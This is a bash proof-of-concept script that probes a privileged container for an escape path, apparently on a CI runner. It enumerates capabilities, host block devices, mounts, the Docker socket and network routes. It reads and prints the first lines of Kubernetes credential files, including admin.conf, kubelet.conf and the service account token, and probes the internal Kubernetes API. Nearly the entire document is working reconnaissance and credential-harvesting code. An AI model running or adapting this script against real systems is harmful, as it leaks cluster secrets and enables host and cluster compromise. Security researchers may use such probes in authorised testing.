#!/bin/bash
echo "=== PoC #4: Privileged Container Escape Probe (XPU Pattern) - v4 ==="
echo "[*] Simulating: --privileged container → host device access → K8s creds"
echo ""
echo "[+] Runner identity:"
whoami && hostname && id
echo ""
echo "[+] Container detection:"
if [ -f /.dockerenv ]; then
  echo "  INSIDE Docker container"
  cat /proc/1/cgroup 2>/dev/null | head -5
else
  echo "  NOT in container (bare metal/VM)"
  cat /proc/1/cgroup 2>/dev/null | head -3
fi
echo ""
echo "[+] Capabilities (CapEff):"
grep -i capeff /proc/self/status 2>/dev/null
echo ""
echo "[+] Block devices visible:"
ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null | head -10 || echo "  (none)"
lsblk 2>/dev/null | head -15
echo ""
echo "[+] Mounts (ext4/xfs/overlay):"
mount 2>/dev/null | grep -E "ext4|xfs|overlay" | head -10
echo ""
echo "[+] Kubernetes credentials (targeted paths):"
for p in /etc/kubernetes/kubelet.conf /etc/kubernetes/admin.conf /var/run/secrets/kubernetes.io/serviceaccount/token; do
  if [ -f "$p" ]; then
    echo "  FOUND: $p"
    head -5 "$p" 2>/dev/null
  fi
done
ls /etc/kubernetes/ 2>/dev/null || echo "  /etc/kubernetes/ not found"
echo ""
echo "[+] Docker socket:"
ls -la /var/run/docker.sock 2>/dev/null || echo "  (no docker socket)"
echo ""
echo "[+] Host network info:"
ip addr show 2>/dev/null | grep "inet " | head -5
ip route show default 2>/dev/null
echo ""
echo "[+] K8s API probe:"
curl -sk --max-time 3 https://10.96.0.1:443/version 2>/dev/null || echo "  K8s API not reachable at 10.96.0.1"
curl -sk --max-time 3 https://kubernetes.default.svc:443/version 2>/dev/null || echo "  kubernetes.default.svc not reachable"
echo ""
echo "=== End PoC #4 v4 ==="
